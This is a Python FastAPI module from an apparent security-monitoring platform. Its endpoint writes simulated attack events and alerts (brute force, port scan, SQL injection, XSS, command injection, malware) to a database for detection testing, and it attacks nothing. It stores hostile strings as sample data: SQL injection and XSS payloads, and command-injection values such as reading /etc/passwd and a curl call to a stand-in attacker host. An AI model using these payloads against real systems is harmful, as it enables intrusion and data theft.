"""Attack Simulation API - controlled security lab workflow"""
import random
import json
from datetime import datetime, timedelta, timezone
from fastapi import APIRouter, Depends, HTTPException
from sqlalchemy.orm import Session
from pydantic import BaseModel
from typing import Optional
from app.database import get_db
from app.models.user import User
from app.models.security_event import SecurityEvent
from app.models.alert import Alert, AlertSeverity, AlertStatus
from app.models.notification import Notification
from app.detector.risk import calculate_risk_score
from app.auth import get_current_user
from app.sse import alert_broadcaster
from app.services.notification_service import dispatch_alert_notifications

router = APIRouter(prefix="/api/simulation", tags=["simulation"])

SIMULATION_SCENARIOS = {
    "brute_force": {
        "name": "Brute Force Attack",
        "description": "Simulates a brute-force SSH login attack from a single IP",
        "mitre_technique": "T1110",
        "mitre_tactic": "Credential Access",
    },
    "port_scan": {
        "name": "Port Scanning",
        "description": "Simulates port scanning activity from a reconnaissance source",
        "mitre_technique": "T1046",
        "mitre_tactic": "Discovery",
    },
    "sql_injection": {
        "name": "SQL Injection",
        "description": "Simulates SQL injection attempts against a web application",
        "mitre_technique": "T1190",
        "mitre_tactic": "Initial Access",
    },
    "suspicious_login": {
        "name": "Suspicious Login",
        "description": "Simulates authentication from unusual location/time",
        "mitre_technique": "T1078",
        "mitre_tactic": "Initial Access",
    },
    "xss_attack": {
        "name": "Cross-Site Scripting",
        "description": "Simulates XSS payloads injected into web application inputs",
        "mitre_technique": "T1189",
        "mitre_tactic": "Initial Access",
    },
    "command_injection": {
        "name": "Command Injection",
        "description": "Simulates OS command injection attempts through web parameters",
        "mitre_technique": "T1059",
        "mitre_tactic": "Execution",
    },
    "malware": {
        "name": "Malware Detection",
        "description": "Simulates malware indicator detection on an endpoint",
        "mitre_technique": "T1059",
        "mitre_tactic": "Execution",
    },
}


class SimulationRequest(BaseModel):
    attack_type: str
    count: int = 10
    scenario: str = None  # alias support

    def get_type(self):
        return self.attack_type or self.scenario or "brute_force"


@router.get("/scenarios")
def list_scenarios():
    return {"scenarios": [{"id": k, **v} for k, v in SIMULATION_SCENARIOS.items()]}


@router.post("/run")
def run_simulation(data: SimulationRequest, db: Session = Depends(get_db), current_user: User = Depends(get_current_user)):
    attack_type = data.get_type()
    if attack_type not in SIMULATION_SCENARIOS:
        raise HTTPException(status_code=400, detail=f"Unknown attack type: {attack_type}")

    scenario = SIMULATION_SCENARIOS[attack_type]
    org_id = current_user.organization_id
    now = datetime.now(timezone.utc)
    events = []

    if attack_type == "brute_force":
        src_ip = f"203.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        for i in range(data.count):
            ts = now - timedelta(minutes=data.count - i)
            event = SecurityEvent(
                timestamp=ts, event_type="failed_login", category="authentication",
                description=f"Failed login attempt #{i+1} from {src_ip}",
                source_ip=src_ip, username=random.choice(["admin", "root", "ubuntu", "deploy"]),
                action="failed_login", status="failure", severity="high", risk_score=85,
                raw_log=f"timestamp={ts.isoformat()},source_ip={src_ip},action=failed_login,status=failure",
                is_flagged=True, source_file="simulation", organization_id=org_id, user_id=current_user.id,
            )
            db.add(event)
            events.append(event)
        db.flush()

        alert = Alert(
            title="Brute Force Attack Detected",
            description=f"{data.count} failed login attempts from {src_ip} within {data.count} minutes",
            severity=AlertSeverity.HIGH, status=AlertStatus.NEW,
            risk_score=90, confidence=85, source_ip=src_ip,
            mitre_technique="T1110", mitre_tactic="Credential Access",
            evidence=f"Matched rule: SSH Brute Force. {data.count} failed attempts from {src_ip}.",
            recommended_actions=f"Investigate IP {src_ip}. Consider blocking at firewall. Review account lockout policies.",
            organization_id=org_id, event_id=events[0].id,
        )
        db.add(alert)

    elif attack_type == "port_scan":
        src_ip = f"185.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 993, 995, 1433, 3306, 3389, 5432, 8080, 8443]
        scanned = random.sample(ports, min(data.count, len(ports)))
        for port in scanned:
            ts = now - timedelta(seconds=random.randint(1, 300))
            event = SecurityEvent(
                timestamp=ts, event_type="port_scan", category="network",
                description=f"Port {port} scanned from {src_ip}",
                source_ip=src_ip, destination_port=port,
                action="port_scan", status="detected", severity="medium", risk_score=45,
                raw_log=f"timestamp={ts.isoformat()},source_ip={src_ip},destination_port={port},action=port_scan",
                is_flagged=True, source_file="simulation", organization_id=org_id, user_id=current_user.id,
            )
            db.add(event)
            events.append(event)
        db.flush()

        alert = Alert(
            title="Port Scanning Detected",
            description=f"Port scan from {src_ip} targeting {len(scanned)} ports",
            severity=AlertSeverity.MEDIUM, status=AlertStatus.NEW,
            risk_score=50, confidence=70, source_ip=src_ip,
            mitre_technique="T1046", mitre_tactic="Discovery",
            evidence=f"Scanned ports: {', '.join(str(p) for p in scanned)}",
            recommended_actions=f"Investigate {src_ip}. Review firewall rules. Check if scan is authorized.",
            organization_id=org_id, event_id=events[0].id,
        )
        db.add(alert)

    elif attack_type == "sql_injection":
        src_ip = f"45.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        payloads = ["' OR 1=1--", "UNION SELECT * FROM users", "'; DROP TABLE accounts;--", "' OR ''='"]
        for i, payload in enumerate(payloads[:data.count]):
            ts = now - timedelta(minutes=i)
            event = SecurityEvent(
                timestamp=ts, event_type="sql_injection", category="web",
                description=f"SQL injection attempt: {payload[:50]}",
                source_ip=src_ip, action="sql_injection", status="blocked",
                severity="critical", risk_score=90, raw_log=f"payload={payload},source_ip={src_ip}",
                is_flagged=True, source_file="simulation", organization_id=org_id, user_id=current_user.id,
            )
            db.add(event)
            events.append(event)
        db.flush()

        alert = Alert(
            title="SQL Injection Attempt Detected",
            description=f"SQL injection payloads from {src_ip}",
            severity=AlertSeverity.CRITICAL, status=AlertStatus.NEW,
            risk_score=95, confidence=90, source_ip=src_ip,
            mitre_technique="T1190", mitre_tactic="Initial Access",
            evidence=f"Detected payloads: {', '.join(payloads[:data.count])}",
            recommended_actions="Block source IP immediately. Review WAF rules. Audit database access logs.",
            organization_id=org_id, event_id=events[0].id,
        )
        db.add(alert)

    elif attack_type == "suspicious_login":
        src_ip = f"91.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        event = SecurityEvent(
            timestamp=now, event_type="suspicious_login", category="authentication",
            description=f"Suspicious login from unusual location: {src_ip}",
            source_ip=src_ip, username="admin", action="login", status="success",
            severity="medium", risk_score=55, raw_log=f"source_ip={src_ip},action=login,status=success,location=unusual",
            is_flagged=True, source_file="simulation", organization_id=org_id, user_id=current_user.id,
        )
        db.add(event)
        db.flush()

        alert = Alert(
            title="Suspicious Authentication Detected",
            description=f"Login from unusual location: {src_ip}",
            severity=AlertSeverity.MEDIUM, status=AlertStatus.NEW,
            risk_score=60, confidence=55, source_ip=src_ip, username="admin",
            mitre_technique="T1078", mitre_tactic="Initial Access",
            evidence="Login from IP with unusual geolocation pattern",
            recommended_actions="Verify with account owner. Check for MFA status. Review recent access patterns.",
            organization_id=org_id, event_id=event.id,
        )
        db.add(alert)

    elif attack_type == "xss_attack":
        src_ip = f"172.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        payloads = ["<script>alert('XSS')</script>", "<img onerror=alert(1)>", "<svg onload=alert('xss')>"]
        for i, payload in enumerate(payloads[:data.count]):
            ts = now - timedelta(minutes=i)
            event = SecurityEvent(
                timestamp=ts, event_type="xss_attack", category="web",
                description=f"XSS payload detected: {payload[:50]}",
                source_ip=src_ip, action="xss_detected", status="blocked",
                severity="medium", risk_score=55, raw_log=f"payload={payload},source_ip={src_ip}",
                is_flagged=True, source_file="simulation", organization_id=org_id, user_id=current_user.id,
            )
            db.add(event)
            events.append(event)
        db.flush()

        alert = Alert(
            title="Cross-Site Scripting (XSS) Detected",
            description=f"XSS payloads from {src_ip}",
            severity=AlertSeverity.MEDIUM, status=AlertStatus.NEW,
            risk_score=55, confidence=75, source_ip=src_ip,
            mitre_technique="T1189", mitre_tactic="Initial Access",
            evidence=f"Detected XSS payloads: {', '.join(payloads[:data.count])}",
            recommended_actions="Review input sanitization. Check Content Security Policy headers. Audit web application filters.",
            organization_id=org_id, event_id=events[0].id,
        )
        db.add(alert)

    elif attack_type == "command_injection":
        src_ip = f"10.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        payloads = ["; cat /etc/passwd", "| whoami", "$(curl attacker.com)", "`id`"]
        for i, payload in enumerate(payloads[:data.count]):
            ts = now - timedelta(minutes=i)
            event = SecurityEvent(
                timestamp=ts, event_type="command_injection", category="web",
                description=f"OS command injection attempt: {payload}",
                source_ip=src_ip, action="command_injection", status="blocked",
                severity="critical", risk_score=90, raw_log=f"payload={payload},source_ip={src_ip}",
                is_flagged=True, source_file="simulation", organization_id=org_id, user_id=current_user.id,
            )
            db.add(event)
            events.append(event)
        db.flush()

        alert = Alert(
            title="Command Injection Attempt Detected",
            description=f"OS command injection from {src_ip}",
            severity=AlertSeverity.CRITICAL, status=AlertStatus.NEW,
            risk_score=92, confidence=88, source_ip=src_ip,
            mitre_technique="T1059", mitre_tactic="Execution",
            evidence=f"Detected command injection payloads: {', '.join(payloads[:data.count])}",
            recommended_actions="Block source IP. Review input validation. Check for OS-level command execution restrictions.",
            organization_id=org_id, event_id=events[0].id,
        )
        db.add(alert)

    elif attack_type == "malware":
        src_ip = f"10.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        event = SecurityEvent(
            timestamp=now, event_type="malware", category="endpoint",
            description=f"Malware indicator detected on endpoint {src_ip}",
            source_ip=src_ip, action="malware_detected", status="quarantined",
            severity="critical", risk_score=95,
            raw_log=f"source_ip={src_ip},action=malware_detected,status=quarantined,hash=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
            is_flagged=True, source_file="simulation", organization_id=org_id, user_id=current_user.id,
        )
        db.add(event)
        db.flush()

        alert = Alert(
            title="Malware Detected",
            description=f"Malware indicator on endpoint {src_ip}",
            severity=AlertSeverity.CRITICAL, status=AlertStatus.NEW,
            risk_score=95, confidence=85, source_ip=src_ip,
            mitre_technique="T1059", mitre_tactic="Execution",
            evidence="Malware hash matched in detection engine. File quarantined automatically.",
            recommended_actions="Isolate endpoint. Perform full forensic scan. Check lateral movement. Review network traffic.",
            organization_id=org_id, event_id=event.id,
        )
        db.add(alert)

    db.commit()
    db.refresh(alert)

    # Broadcast the new alert via SSE to all connected clients in this org
    alert_broadcaster.broadcast_alert(org_id, alert.to_dict())

    # Dispatch external notifications (email, Slack, webhooks)
    try:
        from app.models.notification_config import NotificationConfig
        notif_config = db.query(NotificationConfig).filter(NotificationConfig.organization_id == org_id).first()
        org = current_user.organization
        org_name = org.name if org else "Niks Security"

        # Check severity filter
        should_notify = False
        alert_severity = alert.severity.value if hasattr(alert.severity, 'value') else str(alert.severity)
        if notif_config:
            severity_map = {
                "critical": notif_config.notify_critical,
                "high": notif_config.notify_high,
                "medium": notif_config.notify_medium,
                "low": notif_config.notify_low,
            }
            should_notify = severity_map.get(alert_severity, False)
        else:
            # Default: notify on critical and high
            should_notify = alert_severity in ("critical", "high")

        if should_notify:
            email_cfg = None
            if notif_config and notif_config.email_enabled:
                email_cfg = {
                    "enabled": True,
                    "smtp_host": notif_config.smtp_host,
                    "smtp_port": notif_config.smtp_port,
                    "smtp_user": notif_config.smtp_user,
                    "smtp_password": notif_config.smtp_password,
                    "to_email": notif_config.to_email,
                    "from_email": notif_config.from_email,
                    "use_tls": notif_config.use_tls,
                }
            slack_url = notif_config.slack_webhook_url if notif_config and notif_config.slack_enabled else None
            custom_whs = []
            if notif_config and notif_config.custom_webhooks:
                import json as _json
                custom_whs = _json.loads(notif_config.custom_webhooks)

            dispatch_alert_notifications(
                alert_data=alert.to_dict(),
                org_name=org_name,
                email_config=email_cfg,
                slack_webhook_url=slack_url,
                custom_webhooks=custom_whs,
            )
    except Exception as e:
        print(f"Notification dispatch error: {e}")  # Don't fail simulation on notification errors

    # Create notification
    notif = Notification(
        title=f"Simulation Complete: {scenario['name']}",
        message=f"Generated {len(events)} events and 1 alert. Scenario: {scenario['name']}",
        type="info",
        user_id=current_user.id,
    )
    db.add(notif)
    db.commit()

    return {
        "message": f"Simulation '{scenario['name']}' completed",
        "scenario": scenario,
        "events_generated": len(events),
        "alerts_generated": 1,
        "simulation_id": f"SIM-{now.strftime('%Y%m%d%H%M%S')}",
    }
